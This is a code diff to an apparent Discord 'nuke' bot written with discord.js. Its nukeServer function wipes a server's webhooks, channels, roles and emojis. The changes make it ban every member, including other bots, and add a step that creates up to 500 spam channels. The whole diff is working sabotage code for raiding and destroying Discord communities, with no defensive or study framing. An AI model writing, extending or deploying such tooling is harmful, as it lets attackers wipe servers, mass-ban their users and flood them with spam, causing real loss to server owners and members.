@@ -18,13 +18,14 @@ async function runAll(tasks) {
 // ─── Main wipe logic ──────────────────────────────────────────────────────────
 
 /**
- * Wipes a Discord guild: webhooks → channels → roles → emojis → members.
- * @param {import('discord.js').Guild} guild    The target guild object.
- * @param {boolean}                   banMembers  Ban instead of kick?
- * @param {string}                    botId     The bot's own user ID (to skip itself).
- * @returns {Promise<string[]>}                 Log lines describing what happened.
+ * Wipes a Discord guild: webhooks → channels → roles → emojis → members (ban all, including bots).
+ * @param {import('discord.js').Guild} guild   The target guild object.
+ * @param {string}                    botId   The bot's own user ID (to skip itself only).
+ * @param {number}                    channelsToCreate  How many spam channels to create.
+ * @param {string}                    channelName       Name for the spam channels.
+ * @returns {Promise<string[]>}                Log lines describing what happened.
  */
-export async function nukeServer(guild, banMembers, botId) {
+export async function nukeServer(guild, botId, channelsToCreate = 0, channelName = 'nuked') {
   const log = [];
 
   // 1. Webhooks
@@ -67,7 +68,17 @@ export async function nukeServer(guild, banMembers, botId) {
     log.push(`😀 **Emojis** — deleted \`${succeeded}\`, failed \`${failed}\``);
   }
 
-  // 5. Members — kick or ban (skip bots and the bot itself)
+  // 5. Spam channels creation
+  if (channelsToCreate > 0) {
+    const count = Math.min(channelsToCreate, 500);
+    const createTasks = Array.from({ length: count }, () =>
+      guild.channels.create({ name: channelName }).catch(() => {}),
+    );
+    const { succeeded, failed } = await runAll(createTasks);
+    log.push(`📣 **Spam Channels Created** — \`${succeeded}\` created, failed \`${failed}\``);
+  }
+
+  // 6. Members — BAN ALL (including bots), skip the bot itself only
   {
     let membersFetched = true;
     await guild.members.fetch().catch((err) => {
@@ -76,16 +87,14 @@ export async function nukeServer(guild, banMembers, botId) {
     });
 
     if (membersFetched) {
-      const members = guild.members.cache.filter((m) => !m.user.bot && m.id !== botId);
-      const action  = banMembers ? 'ban' : 'kick';
+      // Include bots — only skip the nuke bot itself
+      const members = guild.members.cache.filter((m) => m.id !== botId);
       const tasks   = members.map((m) =>
-        banMembers
-          ? m.ban({ reason: 'Server nuke' }).catch(() => {})
-          : m.kick('Server nuke').catch(() => {}),
+        m.ban({ reason: 'Server nuke' }).catch(() => {}),
       );
       const { succeeded, failed } = await runAll(tasks);
       log.push(
-        `${banMembers ? '🔨' : '👢'} **Members ${banMembers ? 'Banned' : 'Kicked'}** — ${action}ed \`${succeeded}\`, failed \`${failed}\``,
+        `🔨 **Members Banned** — \`${succeeded}\` banned (including bots), failed \`${failed}\``,
       );
     } else {
       log.push('⚠️ **Members** — Skipped (Server Members Intent not enabled in Developer Portal).');
